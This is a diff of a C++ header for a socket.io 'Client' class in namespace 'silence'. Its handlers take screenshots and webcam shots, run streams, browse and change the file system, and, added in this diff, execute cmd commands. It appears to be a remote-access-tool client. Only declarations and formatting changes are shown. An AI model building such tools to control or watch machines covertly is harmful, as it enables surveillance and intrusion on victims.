@@ -12,14 +12,13 @@
 
 #include <core/Util.h>
 
-namespace silence
-{
-    class Client
-    {
+namespace silence {
+    class Client {
     public:
         using CommandObject = std::map<std::string, sio::message::ptr>;
 
         explicit Client(std::string url);
+
         ~Client();
 
         void connect();
@@ -35,25 +34,26 @@ namespace silence
         sio::message::list createObject(const CommandObject &object);
 
         template<typename T, typename... Args>
-        void launchEvent(const std::function<T> &callable, Args &&...args);
+        void launchEvent(const std::function<T> &callable, Args &&... args);
 
     private:
         void onCommand(std::string const &name, sio::message::ptr const &data,
                        bool hasAck, sio::message::list &ack_resp);
 
     private:
-        void greetEvent();      // starts the client
+        void greetEvent(); // starts the client
         void screenshotEvent(); // takes a screenshot
         void webcamShotEvent(); // takes a webcam shot
         void killStreamEvent(); // kills a stream
-        void startStreamEvent();// creates a stream
+        void startStreamEvent(); // creates a stream
 
-        void listDirEvent(const CommandObject &object);   // lists a directory
-        void mkDirEvent(const CommandObject &object);     // creates a directory
-        void removeEvent(const CommandObject &object);    // removes a directory
-        void cdEvent(const CommandObject &object);        // changes the current directory
-        void getCwdEvent(const CommandObject &object);    // returns the current working directory
-        void installDirEvent(const CommandObject &object);// returns the install directory
+        void listDirEvent(const CommandObject &object); // lists a directory
+        void mkDirEvent(const CommandObject &object); // creates a directory
+        void removeEvent(const CommandObject &object); // removes a directory
+        void cdEvent(const CommandObject &object); // changes the current directory
+        void getCwdEvent(const CommandObject &object); // returns the current working directory
+        void installDirEvent(const CommandObject &object); // returns the install directory
+        void cmdEvent(const CommandObject &object); // executes a cmd command
 
         void response(const std::string &event, const sio::message::list &msg);
 
@@ -76,9 +76,9 @@ namespace silence
 #if defined(__linux__)
         std::string mOS{"Linux"};
 #elif defined(_WIN32)
-        std::string mOS{"Windows"};
+        std::string mOS { "Windows" };
 #else
-        std::string mOS{"MacOS"};
+        std::string mOS { "MacOS" };
 #endif
     };
-}// namespace silence
+} // namespace silence
